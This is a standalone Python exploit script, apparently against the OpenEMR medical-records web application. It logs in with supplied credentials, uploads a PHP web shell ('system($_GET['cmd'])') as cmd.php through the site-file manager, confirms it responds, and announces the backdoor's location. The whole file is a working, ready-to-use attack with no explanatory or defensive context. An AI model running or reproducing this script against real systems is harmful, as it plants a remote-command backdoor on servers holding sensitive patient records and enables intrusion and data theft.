#!/usr/bin/python
import requests
import sys

def main():
 if len(sys.argv) < 4:
  print("Usage: "+sys.argv[0]+" TARGET_BASE_URI USERNAME PASSWORD\r\n") 
  print("Example: "+sys.argv[0]+" http://192.168.0.1/ admin password \r\n")
  sys.exit(-1)

 s=requests.Session()

 parameters={"new_login_session_management":"1","authProvider":"Default","authUser":sys.argv[2],"clearPass":sys.argv[3],"languageChoice":"1"}

 url1=sys.argv[1]+"interface/main/main_screen.php?auth=login&site=default"
 r=s.post(url1,data=parameters)
 #r.text

 upldurl=sys.argv[1]+"/interface/super/manage_site_files.php"

 multipartboundary="-------------------------104859068710062481661868594123"
 hdr = {'Content-Type': 'multipart/form-data; boundary='+multipartboundary}
  
 multipartboundary="--"+multipartboundary

 body = multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"form_filename\""
 body += "\r\n\r\n\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"form_filedata\""
 body += "\r\n\r\n\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\""
 body += "\r\n\r\n12000000"
 body += "\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"form_image\";  filename=\"cmd.php\""
 body += "\r\nContent-Type: text/php\r\n"
 body += "\r\n"
 body += "<?php system($_GET['cmd']);?>"
 body += "\r\n\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"form_dest_filename\""
 body += "\r\n\r\n\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"form_education\"; filename=\"\""
 body += "\r\nContent-Type: text/php\r\n"
 body += "\r\n\r\n"+multipartboundary
 body += "\r\nContent-Disposition: form-data; name=\"bn_save\""
 body += "\r\n\r\nSave"
 body += "\r\n"+multipartboundary+"--\r\n"
 
 r1=s.post(upldurl,headers=hdr,data=body)
 #print(r1.text)
 #print(body)
 r3=s.get(sys.argv[1]+"/sites/default/images/cmd.php")
 if r3.status_code == 200:
  print("Backdoor file uploaded sucessfully")
  print("Backdoor location: "+sys.argv[1]+"/sites/default/images/cmd.php?cmd=ls")

 
if __name__ == "__main__":
    main()